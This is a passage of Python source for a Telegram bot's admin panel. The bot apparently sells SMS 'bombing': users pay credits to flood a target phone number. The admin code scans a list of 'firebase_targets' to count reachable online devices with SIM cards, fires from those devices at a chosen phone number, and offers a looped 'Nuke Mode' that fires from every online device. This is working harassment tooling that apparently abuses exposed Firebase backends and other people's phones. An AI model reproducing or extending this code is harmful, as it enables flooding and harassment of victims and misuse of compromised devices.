            f"⭐ <b>Lifetime Users</b> {len(rows)}\n\n" +
            ("\n".join(lines) or "none"),
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("lt list")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:redeem")
async def cb_a_redeem(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        rows = _exec("SELECT * FROM redeem_codes ORDER BY created_at DESC "
                     "LIMIT 15", fetch="all")
        lines = [
            f"<code>{r['code']}</code> | {r['amount']} "
            f"{r['currency'] or 'credits'} | {r['used']}/{r['max_uses']}"
            for r in rows
        ]
        await c.message.edit_text(
            "🎁 <b>Redeem Codes</b>\n\n" + ("\n".join(lines) or "none"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="➕ Create",
                                      callback_data="a:redeem_new")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:home")]]))
    except Exception:
        log.exception("redeem admin")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:redeem_new")
async def cb_redeem_new(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await c.message.edit_text(
            "🎁 Step 1/3: currency?",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💳 Credits",
                                      callback_data="a:redeem_cur:credits"),
                 InlineKeyboardButton(text="🪙 Coins",
                                      callback_data="a:redeem_cur:coins")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:home")]]))
    except Exception:
        log.exception("redeem new")
    finally:
        await c.answer()


@dp.callback_query(F.data.startswith("a:redeem_cur:"))
async def cb_redeem_cur(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        cur = c.data.split(":")[2]
        await state.update_data(currency=cur)
        await state.set_state(AdminFSM.redeem_amount)
        await c.message.edit_text(
            f"Currency: <b>{cur}</b>\n\nStep 2/3: send amount.",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("redeem cur")
    finally:
        await c.answer()


@dp.message(AdminFSM.redeem_amount, F.text)
async def fsm_redeem_amt(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        try:
            amt = int(txt)
        except ValueError:
            return await m.answer("Numeric.")
        await state.update_data(amount=amt)
        await state.set_state(AdminFSM.redeem_uses)
        await m.answer("Step 3/3: max uses? (0 = unlimited)")
    except Exception:
        log.exception("redeem amt")


@dp.message(AdminFSM.redeem_uses, F.text)
async def fsm_redeem_uses(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        try:
            uses = int(txt)
        except ValueError:
            return await m.answer("Numeric.")
        if uses <= 0:
            uses = 10 ** 9
        d = await state.get_data()
        code = gen_code(10)
        _exec("INSERT INTO redeem_codes(code,amount,currency,max_uses,"
              "created_by,created_at) VALUES(?,?,?,?,?,?)",
              (code, d["amount"], d.get("currency", "credits"), uses,
               m.from_user.id, int(time.time())))
        log_action(m.from_user.id, "admin_create_code", f"{code}")
        await state.clear()
        await m.answer(
            f"✅ Code: <code>{code}</code>\n"
            f"Amount: <b>{d['amount']} {d.get('currency')}</b>\n"
            f"Uses: <b>{uses}</b>",
            reply_markup=admin_kb())
    except Exception:
        log.exception("redeem uses")


@dp.callback_query(F.data == "a:apis")
async def cb_apis(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
        active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                       fetch="one")["c"]
        per_cat = _exec(
            "SELECT category, COUNT(*) c, COALESCE(SUM(ok_count),0) o, "
            "COALESCE(SUM(fail_count),0) f FROM apis GROUP BY category",
            fetch="all")
        lines = [f"• <b>{r['category'] or '?'}</b>: {r['c']} · "
                 f"{r['o']}✅ {r['f']}❌" for r in per_cat]
        await c.message.edit_text(
            f"🔌 <b>APIs</b>\n"
            f"Total <b>{total}</b> · Active <b>{active}</b>\n\n" +
            "\n".join(lines),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Reseed",
                                      callback_data="a:api_reseed")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:home")]]))
    except Exception:
        log.exception("apis")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:api_reseed")
async def cb_api_reseed(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        seed_all_endpoints(force_refresh=True)
        total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
        await c.answer(f"✅ {total} endpoints", show_alert=True)
    except Exception:
        log.exception("reseed")


@dp.callback_query(F.data == "a:settings")
async def cb_settings(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        keys = [
            ("cost_per_min",   "credits per minute"),
            ("lifetime_cost",  "lifetime price"),
            ("coin_cost",      "coins per firebase fire"),
            ("cooldown",       "seconds between bombs"),
            ("concurrency",    "global workers"),
            ("daily_bonus",    "daily credits"),
            ("referral_bonus", "credits per referral"),
            ("maintenance",    "1 = locked"),
        ]
        lines = [f"<b>{k}</b> = {setting(k)}\n<i>{d}</i>" for k, d in keys]
        rows = []
        for i in range(0, len(keys), 2):
            row = [InlineKeyboardButton(
                text=keys[i][0], callback_data=f"a:set:{keys[i][0]}")]
            if i + 1 < len(keys):
                row.append(InlineKeyboardButton(
                    text=keys[i + 1][0],
                    callback_data=f"a:set:{keys[i + 1][0]}"))
            rows.append(row)
        rows.append([InlineKeyboardButton(text="⬅️ Back",
                                          callback_data="a:home")])
        await c.message.edit_text(
            "⚙️ <b>Settings</b>\n\nTap to change:\n\n" + "\n\n".join(lines),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except Exception:
        log.exception("settings")
    finally:
        await c.answer()


@dp.callback_query(F.data.startswith("a:set:"))
async def cb_set_edit(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        key = c.data.split(":", 2)[2]
        await state.set_state(AdminFSM.edit_setting)
        await state.update_data(key=key)
        await c.message.edit_text(
            f"Edit <b>{key}</b>\nCurrent: <b>{setting(key)}</b>\n\n"
            f"Send new value.",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("set edit")
    finally:
        await c.answer()


@dp.message(AdminFSM.edit_setting, F.text)
async def fsm_edit_setting(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        d = await state.get_data()
        key = d.get("key")
        numeric = {"cost_per_min", "lifetime_cost", "coin_cost", "cooldown",
                   "concurrency", "daily_bonus", "referral_bonus",
                   "maintenance"}
        if key in numeric:
            try:
                int(txt)
            except ValueError:
                return await m.answer("Numeric.")
        set_setting(key, txt)
        log_action(m.from_user.id, "admin_set_setting", f"{key}={txt}")
        await state.clear()
        await m.answer(f"✅ {key} = {txt}", reply_markup=admin_kb())
    except Exception:
        log.exception("edit setting")


@dp.callback_query(F.data == "a:black")
async def cb_black(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        rows = _exec("SELECT * FROM blacklist ORDER BY added_at DESC "
                     "LIMIT 20", fetch="all")
        lines = [f"• <code>{r['target']}</code>" for r in rows]
        await c.message.edit_text(
            "🚫 <b>Blacklist</b>\n\n" + ("\n".join(lines) or "empty"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="➕ Add",
                                      callback_data="a:black_add"),
                 InlineKeyboardButton(text="🗑 Remove",
                                      callback_data="a:black_del")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:home")]]))
    except Exception:
        log.exception("blacklist")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:black_add")
async def cb_black_add(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.blacklist_add)
        await state.update_data(mode="black_add")
        await c.message.edit_text("Send number to block.",
                                  reply_markup=admin_back_kb())
    except Exception:
        log.exception("black add")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:black_del")
async def cb_black_del(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.blacklist_add)
        await state.update_data(mode="black_del")
        await c.message.edit_text("Send number to unblock.",
                                  reply_markup=admin_back_kb())
    except Exception:
        log.exception("black del")
    finally:
        await c.answer()


@dp.message(AdminFSM.blacklist_add, F.text)
async def fsm_black(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        d = await state.get_data()
        mode = d.get("mode", "black_add")
        if mode == "black_add":
            _exec("INSERT OR IGNORE INTO blacklist(target,added_by,added_at) "
                  "VALUES(?,?,?)", (txt, m.from_user.id, int(time.time())))
            await m.answer(f"✅ Blocked <code>{txt}</code>",
                           reply_markup=admin_kb())
        else:
            _exec("DELETE FROM blacklist WHERE target=?", (txt,))
            await m.answer(f"✅ Unblocked <code>{txt}</code>",
                           reply_markup=admin_kb())
        await state.clear()
    except Exception:
        log.exception("black fsm")


@dp.callback_query(F.data == "a:find")
async def cb_find(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.find_user)
        await c.message.edit_text("Send user ID.",
                                  reply_markup=admin_back_kb())
    except Exception:
        log.exception("find")
    finally:
        await c.answer()


@dp.message(AdminFSM.find_user, F.text)
async def fsm_find(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric.")
        uid = int(txt)
        u = get_user(uid)
        if not u:
            return await m.answer("Not found.")
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text="🚫 Ban" if not u["banned"] else "✅ Unban",
                callback_data=f"a:ban:{uid}")],
            [InlineKeyboardButton(text="⬅️ Back",
                                  callback_data="a:home")]])
        await m.answer(
            f"👤 <code>{uid}</code>\n@{u['username'] or '-'}\n"
            f"💳 {u['credits']} · 🪙 {u['coins']}\n"
            f"⭐ {'Yes' if u['lifetime'] else 'No'}\n"
            f"💥 {u['total_bombs']} · 📨 {u['total_sent']} · "
            f"🔥 {u['total_pushes']}\n"
            f"Status: {'🚫 banned' if u['banned'] else '✅ active'}",
            reply_markup=kb)
        await state.clear()
    except Exception:
        log.exception("find fsm")


@dp.callback_query(F.data.startswith("a:ban:"))
async def cb_ban(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        uid = int(c.data.split(":")[2])
        _exec("UPDATE users SET banned=1-banned WHERE user_id=?", (uid,))
        log_action(c.from_user.id, "admin_toggle_ban", str(uid))
        await c.answer("Status changed.", show_alert=True)
    except Exception:
        log.exception("ban")


@dp.callback_query(F.data == "a:bcast")
async def cb_bcast(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.broadcast)
        await c.message.edit_text("Send broadcast message.",
                                  reply_markup=admin_back_kb())
    except Exception:
        log.exception("bcast")
    finally:
        await c.answer()


@dp.message(AdminFSM.broadcast, F.text)
async def fsm_broadcast(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "")
        if txt.startswith("/"):
            return await state.clear()
        await state.clear()
        asyncio.create_task(_do_broadcast(m))
    except Exception:
        log.exception("bcast fsm")


async def _do_broadcast(m: types.Message):
    try:
        users = _exec("SELECT user_id FROM users WHERE banned=0",
                      fetch="all")
        sent = failed = 0
        status = await m.answer(f"📢 Broadcasting to {len(users)}...")
        for row in users:
            try:
                await bot.send_message(row["user_id"], m.html_text or "")
                sent += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.05)
        try:
            await status.edit_text(f"✅ Sent {sent}, failed {failed}",
                                    reply_markup=admin_kb())
        except Exception:
            pass
        log_action(m.from_user.id, "admin_broadcast",
                   f"sent={sent} failed={failed}")
    except Exception:
        log.exception("broadcast")


@dp.callback_query(F.data.startswith("a:logs:"))
async def cb_logs(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        page = int(c.data.split(":")[2])
        per = 15
        total = _exec("SELECT COUNT(*) c FROM logs", fetch="one")["c"]
        max_p = max(0, (total - 1) // per)
        page = min(page, max_p)
        rows = _exec("SELECT * FROM logs ORDER BY ts DESC LIMIT ? OFFSET ?",
                     (per, page * per), fetch="all")
        lines = []
        for r in rows:
            t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
            lines.append(f"<code>{t}</code> | <code>{r['user_id']}</code> | "
                         f"{r['action']} | {r['detail'][:30]}")
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton(
                text="⬅️", callback_data=f"a:logs:{page-1}"))
        if page < max_p:
            nav.append(InlineKeyboardButton(
                text="➡️", callback_data=f"a:logs:{page+1}"))
        kb = ([nav] if nav else []) + \
             [[InlineKeyboardButton(text="⬅️ Back",
                                    callback_data="a:home")]]
        await c.message.edit_text(
            f"📋 <b>Logs</b> {page+1}/{max_p+1}\n\n" +
            ("\n".join(lines) or "empty"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except Exception:
        log.exception("logs")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:export")
async def cb_export(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        rows = _exec("SELECT * FROM users", fetch="all")
        buf = io.StringIO()
        w = csv.writer(buf)
        w.writerow(["user_id", "username", "first_name", "credits", "coins",
                    "banned", "lifetime", "total_bombs", "total_sent",
                    "total_pushes", "ref_count", "created_at"])
        for r in rows:
            w.writerow([r["user_id"], r["username"], r["first_name"],
                        r["credits"], r["coins"], r["banned"],
                        r["lifetime"], r["total_bombs"], r["total_sent"],
                        r["total_pushes"], r["ref_count"], r["created_at"]])
        await c.message.answer_document(
            BufferedInputFile(buf.getvalue().encode(), filename="users.csv"),
            caption=f"📤 {len(rows)} users")
    except Exception:
        log.exception("export")
    finally:
        await c.answer()


# ─────────────────────────────────────────────────────────────
# ADMIN — FIREBASE PANEL
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "a:fb")
async def cb_fb_admin(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.clear()
        total = _exec("SELECT COUNT(*) c FROM firebase_targets",
                      fetch="one")["c"]
        reach = _exec("SELECT COUNT(*) c FROM firebase_targets "
                      "WHERE reachable=1", fetch="one")["c"]
        online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                       "FROM firebase_targets", fetch="one")["s"]
        dev = _exec("SELECT COALESCE(SUM(device_count),0) s "
                    "FROM firebase_targets", fetch="one")["s"]
        await c.message.edit_text(
            f"🔥 <b>Firebase Admin Panel</b>\n\n"
            f"Targets: <b>{total}</b> · Reachable: <b>{reach}</b>\n"
            f"🟢 Online: <b>{online}</b> · 📱 Devices: <b>{dev}</b>",
            reply_markup=fb_admin_kb())
    except Exception:
        log.exception("fb admin")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:fb_status")
async def cb_fb_status(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        rows = _exec("SELECT * FROM firebase_targets ORDER BY "
                     "online_count DESC, id LIMIT 20", fetch="all")
        lines = []
        for r in rows:
            mark = "✅" if r["reachable"] else "❌"
            last = "never"
            if r["last_scan"]:
                last = time.strftime("%m-%d %H:%M",
                                     time.localtime(r["last_scan"]))
            lines.append(
                f"{mark} #{r['id']} 🟢{r['online_count']}/{r['total_count']} "
                f"🕒{last}\n  <code>{r['name'][:40]}</code>")
        await c.message.edit_text(
            "📊 <b>Firebase Status</b>\n\n" + ("\n".join(lines) or "none"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Scan Next 20",
                                      callback_data="a:fb_scan")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:fb")]]))
    except Exception:
        log.exception("fb status")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:fb_scan")
async def cb_fb_scan(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await c.answer("Scanning next batch...", show_alert=False)
        status = await c.message.edit_text(
            f"🔄 Scanning next {FIREBASE_BATCH_SIZE}...")
        asyncio.create_task(_fb_scan_batch_task(status))
    except Exception:
        log.exception("scan cb")


async def _fb_scan_batch_task(status_msg):
    try:
        async def progress(done, total, ok, fail):
            try:
                await status_msg.edit_text(
                    f"🔄 <b>Scanning batch...</b>\n\n"
                    f"Progress: <b>{done}/{total}</b>\n"
                    f"✅ {ok}  ❌ {fail}")
            except Exception:
                pass
        ok, fail, done, remaining = await scan_batch(progress_cb=progress)
        never = _exec(
            "SELECT COUNT(*) c FROM firebase_targets WHERE active=1 "
            "AND last_scan = 0", fetch="one")["c"]
        total = _exec(
            "SELECT COUNT(*) c FROM firebase_targets WHERE active=1",
            fetch="one")["c"]
        scanned = total - never
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(
                text=f"🔄 Scan Next {FIREBASE_BATCH_SIZE}",
                callback_data="a:fb_scan")],
            [InlineKeyboardButton(text="📊 Status",
                                  callback_data="a:fb_status")],
            [InlineKeyboardButton(text="⬅️ Back",
                                  callback_data="a:fb")]])
        try:
            await status_msg.edit_text(
                f"✅ <b>Batch done</b>\n\n"
                f"Scanned: <b>{done}</b>\n"
                f"✅ {ok}  ❌ {fail}\n\n"
                f"Total scanned: <b>{scanned}/{total}</b>\n"
                f"Never scanned: <b>{never}</b>\n\n"
                f"Tap Scan Next {FIREBASE_BATCH_SIZE} to continue.",
                reply_markup=kb)
        except Exception:
            pass
    except Exception:
        log.exception("batch task")


@dp.callback_query(F.data == "a:fb_scan_full")
async def cb_fb_scan_full(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await c.answer("Full scan started.", show_alert=False)
        status = await c.message.edit_text("🔄 Full scan running...")
        asyncio.create_task(_fb_scan_full_task(status))
    except Exception:
        log.exception("scan full cb")


async def _fb_scan_full_task(status_msg):
    try:
        total_all = _exec(
            "SELECT COUNT(*) c FROM firebase_targets WHERE active=1",
            fetch="one")["c"]
        done_total = 0
        ok_total = 0
        fail_total = 0

        async def progress(d, t, ok, fail):
            try:
                await status_msg.edit_text(
                    f"🔄 <b>Full scan</b>\n\n"
                    f"Batch: <b>{d}/{t}</b>\n"
                    f"✅{ok} ❌{fail}\n\n"
                    f"Overall: <b>{done_total + d}/{total_all}</b>")
            except Exception:
                pass

        while True:
            try:
                ok, fail, done, remaining = await scan_batch(
                    batch_size=FIREBASE_BATCH_SIZE,
                    progress_cb=progress)
            except Exception:
                log.exception("full scan batch")
                break
            if done == 0:
                break
            ok_total += ok
            fail_total += fail
            done_total += done
            gc.collect()
            if done < FIREBASE_BATCH_SIZE:
                break
            await asyncio.sleep(1.5)

        total = _exec(
            "SELECT COUNT(*) c FROM firebase_targets WHERE active=1",
            fetch="one")["c"]
        dev = _exec("SELECT COALESCE(SUM(device_count),0) s "
                    "FROM firebase_targets", fetch="one")["s"]
        online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                       "FROM firebase_targets", fetch="one")["s"]
        try:
            await status_msg.edit_text(
                f"✅ <b>Full scan complete</b>\n\n"
                f"Scanned: <b>{done_total}/{total}</b>\n"
                f"✅ {ok_total}  ❌ {fail_total}\n\n"
                f"🟢 Online: <b>{online}</b>\n"
                f"📱 Devices: <b>{dev}</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="📊 Status",
                                          callback_data="a:fb_status")],
                    [InlineKeyboardButton(text="⬅️ Back",
                                          callback_data="a:fb")]]))
        except Exception:
            pass
    except Exception:
        log.exception("full scan task")


@dp.callback_query(F.data == "a:fb_devices")
async def cb_fb_devices_prompt(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.fb_view_devices)
        await c.message.edit_text(
            "📱 <b>View Devices</b>\n\n"
            "Send firebase ID (or 0 = busiest).",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("devices prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.fb_view_devices, F.text)
async def fsm_fb_view(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric.")
        fid = int(txt)
        if fid == 0:
            row = _exec("SELECT * FROM firebase_targets "
                        "ORDER BY online_count DESC LIMIT 1", fetch="one")
            if not row:
                await state.clear()
                return await m.answer("No targets.")
            fid = row["id"]
        t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
                  fetch="one")
        if not t:
            await state.clear()
            return await m.answer("Not found.")
        rows = _exec("SELECT * FROM firebase_devices WHERE firebase_id=? "
                     "ORDER BY id DESC LIMIT 100", (fid,), fetch="all")
        await state.clear()
        if not rows:
            return await m.answer(
                f"📱 <b>{t['name'][:40]}</b>\n\nNo devices scanned yet.",
                reply_markup=admin_back_kb())
        online_lines = []
        offline_lines = []
        for d in rows:
            try:
                obj = json.loads(d["info"]) if d["info"] else {}
            except Exception:
                obj = {}
            label = obj.get("name") or d["device_key"][:16]
            sims = obj.get("sims") or [0]
            if obj.get("online"):
                online_lines.append(
                    f"🟢 <code>{d['device_key'][:14]}</code> · "
                    f"{label[:20]} · SIMs {len(sims)}")
            else:
                offline_lines.append(
                    f"⚫ <code>{d['device_key'][:14]}</code> · "
                    f"{label[:20]}")
        text = (f"📱 <b>{t['name'][:40]}</b>\n"
                f"🟢 {t['online_count']}/{t['total_count']} online\n\n"
                f"<b>Online ({len(online_lines)}):</b>\n" +
                ("\n".join(online_lines[:30]) or "none"))
        if offline_lines:
            text += (f"\n\n<b>Offline ({len(offline_lines)}):</b>\n" +
                     "\n".join(offline_lines[:10]))
        if len(text) > 3800:
            text = text[:3800] + "\n…"
        await m.answer(text, reply_markup=admin_back_kb())
    except Exception:
        log.exception("view devices")


@dp.callback_query(F.data == "a:fb_slot1")
async def cb_fb_slot1(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await _show_slot(c, 1)
    except Exception:
        log.exception("slot1")


@dp.callback_query(F.data == "a:fb_slot2")
async def cb_fb_slot2(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await _show_slot(c, 2)
    except Exception:
        log.exception("slot2")


async def _show_slot(c, slot):
    try:
        row = fb_test_slot_get(slot)
        if not row:
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎯 Set device",
                                      callback_data=f"f:slot_set:{slot}")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:fb")]])
            await c.message.edit_text(
                f"🎯 <b>Test ID {slot}</b>\n\nNot set.",
                reply_markup=kb)
            return
        t = _exec("SELECT * FROM firebase_targets WHERE id=?",
                  (row["firebase_id"],), fetch="one")
        name = t["name"] if t else f"#{row['firebase_id']}"
        await c.message.edit_text(
            f"🎯 <b>Test ID {slot}</b>\n\n"
            f"Firebase: <code>{name[:40]}</code>\n"
            f"Device: <code>{row['device_key'][:40]}</code>",
            reply_markup=fb_slot_kb(slot))
    except Exception:
        log.exception("show slot")


@dp.callback_query(F.data.startswith("f:slot_set:"))
async def cb_fb_slot_set(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        slot = int(c.data.split(":")[2])
        await state.set_state(AdminFSM.fb_slot_set)
        await state.update_data(slot=slot)
        await c.message.edit_text(
            f"🎯 Set Test ID {slot}\n\n"
            f"Send: <code>fid device_id</code>\n"
            f"Example: <code>1 abc123</code>",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("slot set prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.fb_slot_set, F.text)
async def fsm_fb_slot_set(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        parts = txt.split(maxsplit=1)
        if len(parts) != 2 or not parts[0].isdigit():
            return await m.answer("Format: <code>fid device_id</code>")
        fid = int(parts[0])
        dev = parts[1].strip()
        d = await state.get_data()
        slot = d.get("slot")
        fb_test_slot_set(slot, fid, dev)
        log_action(m.from_user.id, "fb_slot_set",
                   f"slot={slot} fid={fid} dev={dev}")
        await state.clear()
        await m.answer(
            f"✅ Test ID {slot} = <code>{dev[:40]}</code>",
            reply_markup=admin_kb())
    except Exception:
        log.exception("slot set")


@dp.callback_query(F.data.startswith("f:slot_clear:"))
async def cb_fb_slot_clear(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        slot = int(c.data.split(":")[2])
        fb_test_slot_clear(slot)
        await c.answer(f"Cleared slot {slot}.", show_alert=True)
    except Exception:
        log.exception("slot clear")


@dp.callback_query(F.data.startswith("f:slot_fire:"))
async def cb_fb_slot_fire(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        slot = int(c.data.split(":")[2])
        row = fb_test_slot_get(slot)
        if not row:
            return await c.answer("Slot not set.", show_alert=True)
        await state.set_state(AdminFSM.fb_slot_fire_num)
        await state.update_data(slot=slot)
        await c.message.edit_text(
            f"🎯 Fire from Test ID {slot}\n\nSend target phone number.",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("slot fire prompt")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:fb_push")
async def cb_fb_push_prompt(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.fb_push_id)
        await c.message.edit_text(
            "📨 <b>Broadcast push</b>\n\n"
            "Send firebase ID (or 0 = busiest).",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("push prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.fb_push_id, F.text)
async def fsm_fb_push_id(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric.")
        fid = int(txt)
        if fid == 0:
            row = _exec("SELECT * FROM firebase_targets "
                        "ORDER BY online_count DESC LIMIT 1", fetch="one")
            if not row:
                await state.clear()
                return await m.answer("No targets.")
            fid = row["id"]
        t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
                  fetch="one")
        if not t:
            await state.clear()
            return await m.answer("Not found.")
        await state.update_data(fb_push_id=fid)
        await state.set_state(AdminFSM.fb_push_msg)
        await m.answer(f"Push to <b>{t['name'][:30]}</b>\n\nSend message.")
    except Exception:
        log.exception("push fid")


@dp.message(AdminFSM.fb_push_msg, F.text)
async def fsm_fb_push_msg(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        d = await state.get_data()
        fid = d.get("fb_push_id")
        t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
                  fetch="one")
        if not t:
            await state.clear()
            return await m.answer("Missing.")
        message = txt[:300]
        await state.clear()
        status = await m.answer(f"📨 Pushing to <b>{t['name'][:30]}</b>...")
        # broadcast: fire from every online device
        stop_ev = asyncio.Event()
        FB_SEND_STOPS[m.from_user.id] = stop_ev
        asyncio.create_task(_run_fb_blast(status, m.from_user.id,
                                           "broadcast", message, 0,
                                           stop_ev))
        log_action(m.from_user.id, "admin_fb_push", f"fid={fid}")
    except Exception:
        log.exception("push msg")


@dp.callback_query(F.data == "a:fb_nuke")
async def cb_fb_nuke_prompt(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.fb_nuke_fid)
        await c.message.edit_text(
            "💣 <b>Nuke Mode</b>\n\nContinuous fire from every online "
            "device, looped.\n\nSend firebase ID (or 0 = busiest).",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("nuke prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.fb_nuke_fid, F.text)
async def fsm_fb_nuke_fid(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric.")
        fid = int(txt)
        if fid == 0:
            row = _exec("SELECT * FROM firebase_targets "
